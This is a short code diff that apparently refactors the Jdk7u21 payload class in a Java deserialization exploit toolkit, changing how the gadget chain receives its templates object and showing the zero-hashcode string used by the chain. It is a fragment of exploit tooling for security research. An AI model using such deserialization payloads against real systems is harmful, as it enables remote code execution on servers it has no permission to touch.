@@ -57,11 +57,10 @@ LinkedHashSet.readObject()
 @PayloadTest ( precondition = "isApplicableJavaVersion")
 @Dependencies()
 @Authors({ Authors.FROHOFF })
-public class Jdk7u21 implements ObjectPayload<Object> {
+public class Jdk7u21 extends ParameterizedTransletObjectPayload<Object> {
 
-	public Object getObject(final String command) throws Exception {
-		final Object templates = Gadgets.createTemplatesImpl(command);
-
+	@Override
+	protected Object getObject(Object templates) throws Exception {
 		String zeroHashCodeStr = "f5a5a608";
 
 		HashMap map = new HashMap();
